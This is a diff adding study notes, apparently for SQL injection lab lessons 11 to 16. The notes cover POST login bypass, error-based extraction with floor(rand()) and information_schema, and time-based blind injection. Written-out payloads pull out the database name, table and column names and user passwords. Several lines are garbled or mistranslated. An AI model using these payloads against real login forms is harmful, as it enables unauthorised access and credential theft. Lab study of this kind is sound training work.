@@ -125,6 +125,75 @@
   * There is a waiting response from the browser. Since the query was able to detect the database it gives us the response. 
   * If the database name were incorrect, we would not have got a waiting response.
 
+## lesson 11 & 12: 
+### Post Error-based single & double quotes
+  * There is a login page and we try to login using a username as admin and password as some random value. Couldn't login.
+  * Now login, using username and password as single quotes. Couldn't login. Similarly, the failed login error appears for double quotes for both username and
+  * password. But when we enter a double quote for just the username the SQL breaks and has an error.
+  * Using a backslash (/) we get a better understanding of the query. We come to the result that we have a double quote followed by the bracket. 
+  * Hence we have successfully derived the query. 
+  * So the knowledge we take out from this result is that the developer has used the query
+  * Select * from TABLE where username= (“$uname”) and password=(“$password”) LIMIT 0,1
+  * Now in order to fix the query so that it works, we can balance the quotes or comment out the rest of the query. 
+  * So I comment out the rest of my query in the username field
+  * Now as I press enter, it becomes a valid query though we are not able to login and it does not give us an error message.
+  * Now we alter the username to “) or 1=1 #: And we are successfully able to login.
+  * Similarly, we may get the records for the second user through the username “) or 1=1 LIMIT 2,1 #
+  * The query simply checks for the second OR condition, validates the user, and prints the record of the second row.
+
+## lesson 13 & 14: 
+### Double-injection single quotes with string
+  * It uses the same mechanism as we have used in this lab.
+  * Inputting a large number or a single quote as a username and password does not work. 
+  * It still gives us a “Login Attempt Failed” message.Now we try the double quotes in the username and voila, the query breaks.
+  * So what we can infer from this error message is that there is ‘ “/” and password=” ” LIMIT 0,1 ‘ at line 1
+  * Now we use ” or 1 # to bypass the login and we have success. The reason is that the 1 used after OR resolves to true and as a result we have successful query.
+  * The password is not matched since we commented out the rest of the query.
+  * Now we move on to the next query, which is
+  * Select concat((select database()));
+  * This basically selects the database and dumps it as a string. If we add the floor and random function to it, it becomes
+  * select concat((select database() ), floor(rand(0)*2 ));
+  * And we have security being concatenated in the output:
+  * We use the information schema table as covered previously to build our query further:
+  * select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.tables group by c)a;
+  * And we use it on the username. Please remember to concat your query so that the query gets executed.
+
+## Lessons 15 & 16
+### Blind Boolean time-based with single and double quotes.
+  * So now we move on to POST Parameter Blind-based Boolean injections which are like 1 or 1=1,
+  * 1 AND 1=1, which means for the first query we have the Boolean value 1 and for the second we also have the Boolean value 1, which equals to TRUE, since an AND function is involved. In order to bypass the lab session 16 we use “) or (“1”)=”1 for bypassing the login. 
+  * We comment the query by using # if we just want to enter the username.
+  * Now we move on to our next demonstration using Boolean-based blind SQL injections. This time we form the query “) or AND sleep(15) #
+  * but the query gets no response. We try to correct our query by using “) or OR sleep(15) #
+  * The query eventually becomes select col1, col2 from TABLE where username= (” “) or sleep(15)”) and password=(” user data”);
+  * Now since the “) does not result in TRUE, the AND statement fails and the OR statement executes successfully. 
+  * Now if we change our AND query to admin”) or OR sleep(15) # we have a valid query and it results in TRUE, so our query gets successfully executed.
+  * less-15 POST-Blind- Boolian/time Based-Single quotes (based on bool/time delayed single quote POST blind)
+  * Blind-based on Boolean-string
+  * There is no response to any input, so time delay.
+  * Boolean test payload
+  * uname=admin' and 1=1 --+&passwd=admin&submit=Submit //Login successful
+  * uname=admin' and 1=2 --+&passwd=admin&submit=Submit //Login failed
+  * Time delay test payload
+  * uname=admin' and sleep(5) --+&passwd=admin&submit=Submit
+  * Obvious delay, make sure to use delayed injection.
+  * Manual delay injection is the most deadly.
+  * Explode the library, table, column name, value, give it once.
+  * uname=admin' and if(length(database())=8,sleep(5),1)--+&passwd=admin&submit=Submit
+  * uname=admin' and if(left(database(),1)='s',sleep(5),1)--+&passwd=admin&submit=Submit
+  * uname=admin' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+&passwd=admin&submit=Submit
+  * uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+&passwd=admin&submit=Submit
+  * uname=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
+  * uname=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
+  * Less-16 POST-Blind- Boolian/Time Based-Double quotes (based on bool type/time delay double quotes POST type blind)
+  * No matter how I enter this question in the login box, there is no error message displayed, and the guess is that the delayed blind.
+  * Method one, time delay injection
+  * The payload is similar to less-15, just change the single quotation marks from the previous question to double quotation marks and parentheses ") and you're done.
+  * Method two: kinky tricks:
+  * Universal account bypass password verification: admin")#
+
+
+
 
 
 
